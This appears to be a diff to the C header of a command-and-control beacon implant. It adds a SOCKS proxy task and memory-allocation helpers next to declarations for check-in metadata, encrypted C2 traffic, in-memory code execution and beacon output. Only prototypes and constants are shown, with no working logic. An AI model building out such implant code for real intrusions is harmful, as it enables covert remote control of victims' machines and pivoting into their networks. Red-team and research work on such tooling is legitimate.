@@ -17,6 +17,7 @@
 #define TASK_EXIT  0
 #define TASK_SLEEP 1
 #define TASK_PICO  2
+#define TASK_SOCKS 3
 
 typedef struct {
     int  sleep;
@@ -42,19 +43,23 @@ typedef struct {
 typedef datap formatp;
 typedef void ( * PICO_GO ) ( char *, int );
 
-void go                ( char * );
-void generate_metadata ( );
-UINT random_uint       ( );
-void random_bytes      ( UCHAR *, size_t );
-void get_internal_ip   ( UCHAR * );
-void format_checkin    ( formatp * );
-BOOL rsa_encrypt       ( UCHAR *, ULONG, UCHAR *, ULONG * );
-BOOL aes_encrypt       ( UCHAR *, ULONG, UCHAR *, UCHAR *, UCHAR *, ULONG * );
-BOOL compute_hmac      ( UCHAR *, ULONG, UCHAR *, ULONG, UCHAR * );
-void process_messages  ( char *, size_t );
-void set_sleep         ( char *, int );
-void execute_pico      ( char *, int );
-void exit_beacon       ( );
+void   go                ( char * );
+void   generate_metadata ( );
+UINT   random_uint       ( );
+void   random_bytes      ( UCHAR *, size_t );
+void   get_internal_ip   ( UCHAR * );
+void   format_checkin    ( formatp * );
+BOOL   rsa_encrypt       ( UCHAR *, ULONG, UCHAR *, ULONG * );
+BOOL   aes_encrypt       ( UCHAR *, ULONG, UCHAR *, UCHAR *, UCHAR *, ULONG * );
+BOOL   compute_hmac      ( UCHAR *, ULONG, UCHAR *, ULONG, UCHAR * );
+void   process_messages  ( char *, size_t );
+LPVOID allocate_memory   ( size_t, DWORD );
+void   free_memory       ( LPVOID );
+void   set_sleep         ( char *, int );
+void   execute_pico      ( char *, int );
+void   exit_beacon       ( );
+void   execute_socks     ( char *, int );
+void   beacon_output_ex ( int, char *, int, int );
 
 /**
  * Data Parser API
@@ -83,8 +88,8 @@ void   BeaconFormatFree     ( formatp * parser );
  * Output API
  */
 
-void BeaconPrintf ( int type, char * fmt, ... );
-void BeaconOutput ( int type, char * data, int len );
+void BeaconPrintf   ( int type, char * fmt, ... );
+void BeaconOutput   ( int type, char * data, int len );
 
 #define CALLBACK_OUTPUT      0x0
 #define CALLBACK_METADATA    0x1
